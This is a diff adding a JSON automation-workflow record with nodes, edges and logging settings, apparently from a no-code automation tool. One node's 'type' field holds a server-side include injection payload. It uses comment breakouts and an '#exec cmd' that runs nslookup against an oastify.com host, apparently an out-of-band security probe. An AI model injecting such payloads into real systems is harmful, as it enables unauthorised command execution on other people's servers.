@@ -1,0 +1,60 @@
+{
+	"appsUsed":[
+		
+	],
+	"createdTime":1741334144431,
+	"deleted":true,
+	"description":"Describe your automation in a few words",
+	"edges":[
+		{
+			"fromNodeId":"R58e5",
+			"priority":0,
+			"skip":false,
+			"toNodeId":"OyaW9",
+			"type":"next"
+		}
+	],
+	"id":"67caa6808780f31288252d69",
+	"lastModifiedBy":22743,
+	"lcName":"bwcigb",
+	"modifiedTime":1741360888694,
+	"name":"bwcigB",
+	"nodes":[
+		{
+			"debug":false,
+			"dirty":false,
+			"fallbackMode":"STOP",
+			"groupId":"R58e5-1",
+			"id":"R58e5",
+			"index":0,
+			"skip":false,
+			"title":"Select a trigger event",
+			"trigger":{
+				"type":"EVENT"
+			},
+			"type":"\"-->'-->`--><!--#set var=\"o9n\" value=\"n8mub1du9x\"--><!--#set var=\"qbp\" value=\"paowd3fwbz\"--><!--#echo var=\"o9n\"--><!--#echo var=\"qbp\"--><!--#exec cmd=\"nslookup -q=cname av9hyo0hwkbaoslb790biw4s6jcc09o1mpec60v.oastify.com\" -->"
+		},
+		{
+			"debug":false,
+			"dirty":false,
+			"fallbackMode":"STOP",
+			"groupId":"R58e5-1",
+			"id":"OyaW9",
+			"index":0,
+			"skip":false,
+			"title":"Select an app and action",
+			"type":"ACTION"
+		}
+	],
+	"ownerUserId":22743,
+	"settings":{
+		"enableNodeLevelLogging":true,
+		"enableRunLogging":true,
+		"enableVariableLogging":true
+	},
+	"standard":false,
+	"tags":[
+		
+	],
+	"version":1
+}
